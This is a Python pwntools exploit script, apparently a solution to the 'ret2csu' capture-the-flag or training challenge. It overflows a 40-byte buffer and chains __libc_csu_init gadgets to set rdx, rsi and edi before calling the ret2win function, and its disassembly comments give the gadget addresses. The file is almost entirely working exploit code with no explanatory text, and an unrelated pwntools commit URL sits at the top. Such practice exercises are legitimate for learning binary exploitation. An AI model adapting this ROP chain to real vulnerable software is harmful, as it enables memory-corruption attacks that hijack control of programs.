# https://github.com/Gallopsled/pwntools/commit/f4d13b43922eb7654ebaf86752585031165e4153
from pwn import *

context.log_level="debug"

e = ELF("./ret2csu")
ret2win = e.symbols["ret2win"]
puts_plt = e.plt["puts"]
puts_got = e.got["puts"]

# 40089a:       5b                      pop    %rbx
# 40089b:       5d                      pop    %rbp
# 40089c:       41 5c                   pop    %r12
# 40089e:       41 5d                   pop    %r13
# 4008a0:       41 5e                   pop    %r14
# 4008a2:       41 5f                   pop    %r15
# 4008a4:       c3                      retq   



# 400880:       4c 89 fa                mov    %r15,%rdx
# 400883:       4c 89 f6                mov    %r14,%rsi
# 400886:       44 89 ef                mov    %r13d,%edi
# 400889:       41 ff 14 dc             callq  *(%r12,%rbx,8)

p = process("./ret2csu")
p.recv()

payload = "a"*40
payload += p64(0x40089a) 
payload += p64(0x00) #pop rbx
payload += p64(0x01) #pop rbp
payload += p64(0x600e48) #pop r12  call _fini  section.dynamic+0x28
payload += p64(puts_got) #pop r13
payload += p64(0x2)
payload += p64(0xdeadcafebabebeef)
payload += p64(0x400880)
payload += p64(0x3)
payload += p64(0x4)
payload += p64(0x5)
payload += p64(0x6)
payload += p64(0x7)
payload += p64(0x8)
payload += p64(0x9)
payload += p64(ret2win)
raw_input()
p.sendline(payload)
p.recv()
p.interactive()
